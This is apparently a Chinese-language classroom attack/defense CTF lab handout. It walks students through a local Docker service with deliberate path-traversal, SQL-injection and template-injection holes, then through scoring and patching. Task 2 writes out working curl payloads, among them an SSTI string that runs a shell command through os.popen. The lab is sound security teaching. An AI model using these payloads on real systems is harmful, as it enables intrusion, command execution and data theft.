# Lab A · 一個服務，三個洞

上篇「站穩」的動手環節。60 分鐘，目標是走完一次完整的回合：**找到洞 → 拿到 flag → 提交 → 打補丁 → 看 checker 判你**。

---

## 1. 你要跑的

```bash
cd labs/lab-a
docker compose up -d --build     # 第一次約 1–2 分鐘（要拉映像）
```

起不來的話，先確認 Docker Desktop 有開：

```bash
docker info >/dev/null && echo "docker ok"
```

起來之後：

| 服務 | 網址 | 是什麼 |
|---|---|---|
| 你的服務 | http://localhost:8001 | 你要守住、要修的機器 |
| 對手的服務 | http://localhost:8002 | 你要打的機器（bot 用它當你的對手） |
| 記分板 | http://localhost:8080 | 交 flag、看分數 |

看它有沒有在跑：

```bash
docker compose ps
docker compose logs --tail=20 checker
```

### 課堂模式：180 秒一輪

預設的 60 秒是給「一小時跑十幾輪」用的；上課建議 180 秒，一輪剛好是真賽回合的 1/5：

```bash
docker compose -f docker-compose.yml -f docker-compose.class.yml up -d --build
```

起來之後記分板會顯示「每輪 180 秒」，checker 的結算、bot 的出手也一起換。想用別的數字（例如 90 秒），`cp .env.example .env` 再改 `ROUND_SECONDS`／`BOT_INTERVAL` 就好，不用動 compose 檔。兩個檔案都指定時，`docker-compose.class.yml` 的值優先。

---

## 2. 規則

- **一輪多長，看你怎麼起**：`docker compose up -d` 是 300 秒；課堂用 `docker-compose.class.yml` 是 180 秒（真賽 15 分鐘的 1/5）；想自己調就把 `.env.example` 複製成 `.env` 再改。checker 每輪做三件事：換三條 flag、驗三個功能、報分。
- **防禦分 +10／輪**：checker 的三個功能全過才給。
- **被偷 -10／條**：bot 每輪從兩條路來（flag1 路徑穿越、flag2 模板注入），偷到一條就扣 10；同一條每輪只扣一次。
- **攻擊分 +15**：提交對手的一條 flag。三條（flag1／flag2／flag3）各算一次，同一條重複交不再加，一輪滿分 45。
- 三條 flag 都長這樣：`flag{9989f5c9921799e3bcde}`。**每輪三條一起換，看到就要馬上交。**

---

## 3. 五個任務

### 任務 1 · 找洞（10 分鐘）

源碼在你手上：`target/app.py`。三個洞，難度遞增，各拿一條 flag：

| # | 位置 | 提示 | 拿到哪條 |
|---|---|---|---|
| 1 | `/download` | 檔案路徑是怎麼拼出來的？ | `flag1`（`/srv/flag1.txt`） |
| 2 | `/login` | 那條 SQL 字串，使用者輸入有被處理過嗎？ | `flag3`（登入成 admin 後 `/admin` 印出來） |
| 3 | `/hello` | `render_template_string` 收到的是什麼？ | `flag2`（SSTI 自己讀 `/srv/flag2.txt`） |

### 任務 2 · 從對手身上讀出 flag（15 分鐘）

目標是 `http://localhost:8002`。三條路各拿一條，挑一條先跑通就夠：

```bash
# 路 1：路徑穿越 → flag1
curl 'http://localhost:8002/download?file=../flag1.txt'

# 路 2：SQL 注入繞過登入，再看 admin 頁 → flag3
curl -c /tmp/ck -d "username=admin' -- &password=x" http://localhost:8002/login
curl -b /tmp/ck http://localhost:8002/admin

# 路 3：模板注入 → flag2（先確認 49，再換成讀 flag2）
curl 'http://localhost:8002/hello?name=%7B%7B7*7%7D%7D'
curl -G 'http://localhost:8002/hello' \
     --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /srv/flag2.txt').read()}}"
```

**攻擊挑一條就夠，防守要三條都補**——你打對手只挑最便宜的那條；bot 打你卻是兩條一起來。

### 任務 3 · 提交（5 分鐘）

把 flag 貼進 http://localhost:8080 的提交框。每交對一條 +15（三條共 45），記分板會顯示「本輪已交 2/3」。同一條重複交不再加分；交錯了會告訴你是過期、你自己的、還是不存在。

### 任務 4 · 打補丁（20 分鐘）

改 `target/app.py`，然後只重建你自己的服務：

```bash
docker compose up -d --build target-a
```

**不要** `docker compose up -d --build`（全部重建）。對手的服務是另一份凍結的副本（`opponent/`），你重建全部也不會影響它，但會浪費時間。

改完先自己測，再等 checker：

```bash
curl 'http://localhost:8001/download?file=../flag1.txt'   # 應該被擋
curl 'http://localhost:8001/download?file=welcome.txt'    # 應該還是 200
```

第一條被擋、第二條正常，才叫「補對」。只擋第一條、把第二條也弄壞，就是破壞 SLA。

三條 flag 對應三個洞，bot 打的是 flag1（路徑穿越）和 flag2（模板注入）：
兩個洞都補掉，bot 才偷不到東西。flag3 走 SQL 注入，課堂上沒人打它，但對手會。

### 任務 5 · 看 checker 怎麼判你（5 分鐘）

到記分板看「本輪 SLA」三個燈：

| 燈 | 意思 |
|---|---|
| health 過 | 服務活著 |
| login 過 | 正常使用者還登得進去 |
| download 過 | 檔案下載功能還在 |

三顆都綠 → +10。任何一顆紅 → 這一輪 0 分，而且 bot 照樣偷你。

---

## 4. 常卡住的地方

| 症狀 | 原因 |
|---|---|
| `port is already allocated` | 8001／8002／8080 被別的程式佔用，關掉或改 compose 的埠 |
| 記分板一直是 0 | checker 還沒跑第一輪，等一輪（預設 300 秒）；或看 `docker compose logs checker` |
| 交 flag 說「過期」 | flag 每輪更換，你手上那條是上一輪的 |
| 交 flag 說「已經交過」 | 同一條只算一次；換另外兩條（flag1／flag2／flag3） |
| 交 flag 說「你自己的」 | 你打的是 8001，要打 8002 |
| 分數突然變負 | bot 打穿了，你還沒補 |
| 補丁後 SLA 紅 | 你把功能改壞了，回滾再來 |

---

## 5. 這不是考試

Lab 跑在你自己的機器上，`docker exec` 進 target-b 就能直接 `cat` 到三條 flag（`/srv/flag1.txt`、`flag2.txt`、`flag3.txt`）。**不要那樣做**——你騙到的只有自己。真的比賽裡，對手的機器你只有網路，沒有 shell。

---

## 6. 收工

```bash
docker compose down          # 保留分數
docker compose down -v       # 連分數一起清掉，下次從第 1 輪開始
```
